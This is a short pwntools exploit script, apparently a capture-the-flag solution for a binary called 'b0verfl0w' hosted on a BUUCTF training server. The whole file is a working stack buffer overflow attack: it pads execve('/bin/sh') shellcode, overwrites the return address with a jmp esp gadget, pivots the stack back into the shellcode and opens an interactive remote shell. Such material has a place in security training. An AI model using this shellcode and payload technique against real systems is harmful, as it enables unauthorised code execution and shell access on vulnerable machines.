from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('b0verfl0w')
io = remote('node4.buuoj.cn', 29546)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('b0verfl0w')
jmp_esp = 0x08048504

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
payload = shellcode.ljust(0x24, b'a') + p32(jmp_esp) + asm('sub esp, 0x28; jmp esp;')
io.sendlineafter('What\'s your name?\n', payload)
io.interactive()
